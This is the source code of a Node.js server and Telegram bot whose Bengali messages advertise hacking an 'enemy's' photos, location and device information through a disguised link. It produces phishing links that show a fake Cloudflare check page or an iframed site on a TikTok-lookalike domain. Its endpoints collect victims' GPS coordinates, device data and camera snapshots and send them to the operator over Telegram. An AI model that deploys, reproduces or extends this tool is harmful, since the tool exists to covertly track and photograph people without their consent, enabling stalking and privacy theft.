const fs = require("fs");
const express = require("express");
var cors = require('cors');
var bodyParser = require('body-parser');
const fetch = require('node-fetch');
const TelegramBot = require('node-telegram-bot-api');
const bot = new TelegramBot(process.env["bot"], {polling: true});
var jsonParser=bodyParser.json({limit:1024*1024*20, type:'application/json'});
var urlencodedParser=bodyParser.urlencoded({ extended:true,limit:1024*1024*20,type:'application/x-www-form-urlencoded' });
const app = express();
app.use(jsonParser);
app.use(urlencodedParser);
app.use(cors());
app.set("view engine", "ejs");

//Modify your URL here
var hostURL="https://www.tiktok-official.onrender.com";
// এই লাইনটি পরিবর্তন করা হয়েছে যেন লিঙ্ক শর্ট না হয়
var usecodetabs=false;

app.get("/w/:path/:uri",(req,res)=>{
var ip;
var d = new Date();
d=d.toJSON().slice(0,19).replace('T',':');
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}

if(req.params.path != null){
res.render("webview",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:usecodetabs});
}
else{
res.redirect("https://t.me/ehtool");
}

});

app.get("/c/:path/:uri",(req,res)=>{
var ip;
var d = new Date();
d=d.toJSON().slice(0,19).replace('T',':');
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}


if(req.params.path != null){
res.render("cloudflare",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:usecodetabs});
}
else{
res.redirect("https://t.me/ehtool");
}

});


bot.on('message', async (msg) => {
const chatId = msg.chat.id;

if(msg?.reply_to_message?.text=="🌐 আপনার লিঙ্কটি দিন"){
 createLink(chatId,msg.text);
}

if(msg.text=="/start"){
var m={
reply_markup:JSON.stringify({"inline_keyboard":[[{text:"Create Link",callback_data:"crenew"}]]})
};

bot.sendMessage(chatId, `আসসালামু আলাইকুম, ${msg.chat.first_name} ! , \nআপনি এই বট ব্যবহার করে সামান্য একটি লিঙ্ক পাঠিয়ে আপনার শত্রুর ছবি, লোকেশন এবং তার ডিভাইসের বিভিন্ন তথ্য হ্যাক করে নিতে পারবেন।\n\nআরোও তথ্য জানার জন্য টাইপ করুন, /help`,m);
}
else if(msg.text=="/create"){
createNew(chatId);
}
else if(msg.text=="/help"){
bot.sendMessage(chatId,`এই বটের মাধ্যমে আপনি কেবল একটি সহজ লিঙ্ক পাঠিয়ে মানুষদের ট্র্যাক করতে পারবেন।\n\nপ্রথমে /create লিখে সেন্ড করুন, তারপর বট আপনার কাছে একটা লিঙ্ক চাইবে, আমি যেকেনো একটা ভিডিও এর লিঙ্ক দিয়ে দিবেন।\nআপনার থেকে লিঙ্ক পেলে বট আপনার লিঙ্কে ম্যালওয়ার বসিয়ে আপনাকে আবার ২ টা লিঙ্ক দিবে।
\n\nSpecifications.
\n1. Cloudflare Link: এই পদ্ধতিতে তথ্য সংগ্রহের জন্য একটি ক্লাউডফ্লেয়ার আন্ডার অ্যাটাক পৃষ্ঠা দেখানো হবে এবং পরে ভিকটিমকে গন্তব্যস্থলের URL-এ পুনঃনির্দেশিত করা হবে।
\n2. Webview Link: এটি তথ্য সংগ্রহের জন্য আইফ্রেম ব্যবহার করে একটি ওয়েবসাইট (Ex bing, Dating site ইত্যাদি) দেখাবে।.
( ⚠️অনেক সাইটে x-ফ্রেম হেডার থাকলে এই পদ্ধতিতে কাজ নাও করতে পারে। যেমন https://google.com )
\n\nঅবশ্যই আমাদের চ্যানেলে জয়েন হবেন আরোও টুলস পাওয়ার জন্য\n Telegram Channel : https://t.me/ehtool\nFacebook Page : https://www.facebook.com/profile.php?id=61580675061865
`);
}


});

bot.on('callback_query',async function onCallbackQuery(callbackQuery) {
bot.answerCallbackQuery(callbackQuery.id);
if(callbackQuery.data=="crenew"){
createNew(callbackQuery.message.chat.id);
}
});
bot.on('polling_error', (error) => {
//console.log(error.code);
});


async function createLink(cid,msg){

var encoded = [...msg].some(char => char.charCodeAt(0) > 127);

if ((msg.toLowerCase().indexOf('http') > -1 || msg.toLowerCase().indexOf('https') > -1 ) && !encoded) {

var url=cid.toString(36)+'/'+btoa(msg);
var m={
  reply_markup:JSON.stringify({
    "inline_keyboard":[[{text:"Create new Link",callback_data:"crenew"}]]
  } )
};

var cUrl=`${hostURL}/c/${url}`;
var wUrl=`${hostURL}/w/${url}`;

bot.sendChatAction(cid,"typing");
if(usecodetabs){
var x=await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent("https://api.codetabs.com/v1/proxy/?quest="+cUrl)}`).then(res => res.json());
var y=await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent("https://api.codetabs.com/v1/proxy/?quest="+wUrl)}`).then(res => res.json());

var f="",g="";

for(var c in x){
f+=x[c]+"\n";
}

for(var c in y){
g+=y[c]+"\n";
}

bot.sendMessage(cid, `নতুন লিঙ্কগুলি সফলভাবে তৈরি করা হয়েছে। আপনি নীচের যেকোনো একটি লিঙ্ক ব্যবহার করতে পারেন।.\nURL: ${msg}\n\n✅আপনার লিঙ্কগুলো\n\n🌐 CloudFlare Page Link\n${f}\n\n🌐 WebView Page Link\n${g}`,m);
}
else{

bot.sendMessage(cid, `নতুন লিঙ্কগুলি সফলভাবে তৈরি করা হয়েছে।\nURL: ${msg}\n\n✅আপনার লিঙ্কগুলো\n\n🌐 CloudFlare Page Link\n${cUrl}\n\n🌐 WebView Page Link\n${wUrl}`,m);
}
}
else{
bot.sendMessage(cid,`⚠️ দয়া করে একটি সঠিক লিঙ্ক দিন , লিঙ্কে অবশ্যই http অথবা https থাকতে হবে।`);
createNew(cid);

}
}


function createNew(cid){
var mk={
reply_markup:JSON.stringify({"force_reply":true})
};
bot.sendMessage(cid,`🌐 আপনার লিঙ্কটি দিন`,mk);
}


app.get("/", (req, res) => {
var ip;
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
res.json({"ip":ip});


});


app.post("/location",(req,res)=>{


var lat=parseFloat(decodeURIComponent(req.body.lat)) || null;
var lon=parseFloat(decodeURIComponent(req.body.lon)) || null;
var uid=decodeURIComponent(req.body.uid) || null;
var acc=decodeURIComponent(req.body.acc) || null;
if(lon != null && lat != null && uid != null && acc != null){

bot.sendLocation(parseInt(uid,36),lat,lon);

bot.sendMessage(parseInt(uid,36),`Latitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc} meters`);

res.send("Done");
}
});


app.post("/",(req,res)=>{

var uid=decodeURIComponent(req.body.uid) || null;
var data=decodeURIComponent(req.body.data)  || null;
if( uid != null && data != null){


data=data.replaceAll("<br>","\n");

bot.sendMessage(parseInt(uid,36),data,{parse_mode:"HTML"});


res.send("Done");
}
});


app.post("/camsnap",(req,res)=>{
var uid=decodeURIComponent(req.body.uid)  || null;
var img=decodeURIComponent(req.body.img) || null;

if( uid != null && img != null){

var buffer=Buffer.from(img,'base64');

var info={
filename:"camsnap.png",
contentType: 'image/png'
};


try {
bot.sendPhoto(parseInt(uid,36),buffer,{},info);
} catch (error) {
console.log(error);
}


res.send("Done");

}

});



app.listen(5000, () => {
console.log("App Running on Port 5000!");
});
